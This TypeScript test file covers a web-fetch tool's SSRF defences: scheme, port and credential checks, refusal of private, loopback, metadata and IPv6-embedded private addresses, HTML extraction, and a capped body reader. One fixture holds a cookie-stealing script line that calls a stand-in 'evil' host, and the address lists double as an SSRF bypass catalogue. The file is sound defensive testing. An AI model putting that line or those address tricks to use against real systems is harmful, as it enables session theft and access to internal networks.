import { test } from "node:test";
import assert from "node:assert/strict";
import { extractReadable, isPublicAddress, readCapped, validateFetchTarget, webFetch } from "./web-fetch.ts";

/* Spec 05's external tool, the honest way: a policy first, then the fetch. The policy is pure and
 * takes its own DNS resolver, so every refusal is testable without touching a network. */

const resolver = (ips: string[]) => async () => ips.map(address => ({ address, family: address.includes(":") ? 6 : 4 }));

test("the scheme gate: https, no userinfo, standard port only", async () => {
  assert.ok("error" in await validateFetchTarget("http://example.com/x", { lookup: resolver(["93.184.216.34"]) }), "http is refused even before the address check");
  assert.ok("error" in await validateFetchTarget("https://user:pass@example.com", { lookup: resolver(["93.184.216.34"]) }), "credentials in a URL are never fetched");
  assert.ok("error" in await validateFetchTarget("https://example.com:6379/", { lookup: resolver(["93.184.216.34"]) }), "only 443, so the tool cannot port-scan");
  assert.ok("error" in await validateFetchTarget("ftp://example.com", { lookup: resolver([]) }));
  const ok = await validateFetchTarget("https://example.com/page", { lookup: resolver(["93.184.216.34"]) });
  assert.equal((ok as { url: URL }).url.hostname, "example.com");
});

test("the address gate: private, loopback, link-local and cloud-metadata ranges never get fetched", async () => {
  for (const [host, ips] of [
    ["localhost", ["127.0.0.1"]], ["db.internal", ["10.0.0.7"]], ["printer", ["192.168.1.5"]],
    ["metadata", ["169.254.169.254"]], ["cgnat", ["100.64.0.1"]], ["v6loop", ["::1"]],
    ["v6ula", ["fd00::1"]], ["v6link", ["fe80::1"]], ["v4-in-v6", ["::ffff:127.0.0.1"]], ["zero", ["0.0.0.0"]],
  ] as [string, string[]][]) {
    const r = await validateFetchTarget(`https://${host}/`, { lookup: resolver(ips) });
    assert.ok("error" in r, `${host} (${ips}) must be refused — it is inside this network, not on the public web`);
  }
  const publicOk = await validateFetchTarget("https://example.com/", { lookup: resolver(["93.184.216.34", "2606:2800:220:1:248:1893:25c8:1946"]) });
  assert.equal("url" in publicOk, true);
});

test("a bare public IP is fetched by address, so the resolver cannot be tricked twice", async () => {
  const byIp = await validateFetchTarget("https://93.184.216.34/", { lookup: resolver([]) });
  assert.equal("url" in byIp, true);
  const byPrivateIp = await validateFetchTarget("https://127.0.0.1:443/", { lookup: resolver([]) });
  assert.ok("error" in byPrivateIp);
});

test("isPublicAddress covers the ranges that matter", () => {
  for (const bad of ["127.0.0.1", "127.255.255.255", "10.255.0.1", "172.16.0.1", "172.31.255.255", "192.168.0.1", "169.254.1.1", "100.64.1.1", "0.0.0.0", "::1", "::", "fe80::9", "fd12:3456::1", "::ffff:10.0.0.1"])
    assert.equal(isPublicAddress(bad), false, `${bad} is not public`);
  for (const good of ["93.184.216.34", "8.8.8.8", "2606:2800:220:1:248:1893:25c8:1946", "172.32.0.1", "100.127.255.255".replace("127", "128")])
    assert.equal(isPublicAddress(good), true, `${good} is public`);
});

test("extractReadable: scripts, styles and markup go; the text and title stay", () => {
  const html = `<!doctype html><html><head><title>Chart of the day</title><script>fetch("https://evil/" + document.cookie)</script><style>a{color:red}</style></head><body><h1>Hello</h1><p>First <a href="/x">paragraph</a> with a link.</p><!--note--><p>Second one.</p></body></html>`;
  const out = extractReadable(html);
  assert.equal(out.title, "Chart of the day");
  assert.match(out.text, /Hello First paragraph with a link\. Second one\./);
  assert.ok(!out.text.includes("evil"), "script bodies are dropped, not flattened into text");
  assert.ok(!out.text.includes("color:red"));
});

test("extractReadable keeps plain text as itself and truncates with a stated count", () => {
  const plain = extractReadable("just words, no markup at all");
  assert.equal(plain.text, "just words, no markup at all");
  const long = extractReadable("x".repeat(9000));
  assert.ok(long.text.length <= 4200, "the excerpt is capped so one fetch cannot eat the token budget");
  assert.match(long.text, /truncated/);
});

test("an IPv6 literal in brackets is classified by its address, not by the brackets", async () => {
  for (const url of ["https://[::1]/", "https://[::]/", "https://[::ffff:127.0.0.1]/", "https://[::ffff:169.254.169.254]/", "https://[fd00::1]/", "https://[fe80::1]/", "https://[fec0::1]/", "https://[ff02::1]/", "https://[2002:7f00:1::]/", "https://[64:ff9b::a00:1]/", "https://[2001:db8::1]/"]) {
    const r = await validateFetchTarget(url, { lookup: resolver([]) });
    assert.ok("error" in r, `${url} must be refused — it is inside or reserved space`);
  }
  const publicV6 = await validateFetchTarget("https://[2606:2800:220:1:248:1893:25c8:1946]/", { lookup: resolver([]) });
  assert.equal("url" in publicV6, true, "a public v6 literal is still fetchable");
});

test("isPublicAddress rejects mapped, compat, 6to4 and NAT64 forms that embed a private v4", () => {
  for (const bad of ["[::1]", "::ffff:10.0.0.1", "::ffff:7f00:1", "::127.0.0.1", "2002:c0a8:101::", "64:ff9b::127.0.0.1", "fe80::1%eth0", "fec0::1", "ff02::1", "2001:0:1::1"])
    assert.equal(isPublicAddress(bad), false, `${bad} is not public`);
  for (const good of ["::ffff:93.184.216.34", "2002:5db8:d822::", "64:ff9b::5db8:d822"])
    assert.equal(isPublicAddress(good), true, `${good} wraps a public v4`);
});

test("the body reader stops at the cap and cancels the stream", async () => {
  let pulled = 0, cancelled = false;
  const chunk = new TextEncoder().encode("x".repeat(64_000));
  const body = new ReadableStream<Uint8Array>({
    pull(controller) { pulled++; controller.enqueue(chunk); },
    cancel() { cancelled = true; },
  });
  const result = await webFetch("https://example.com/big", {
    lookup: resolver(["93.184.216.34"]),
    fetchImpl: (async () => new Response(body, { status: 200, headers: { "content-type": "text/html" } })) as never,
  });
  assert.equal(result.ok, true);
  assert.ok(pulled <= 10, `read ${pulled} chunks; the cap must stop the stream near 512 KB`);
  assert.equal(cancelled, true, "the rest of the body is not downloaded");
});
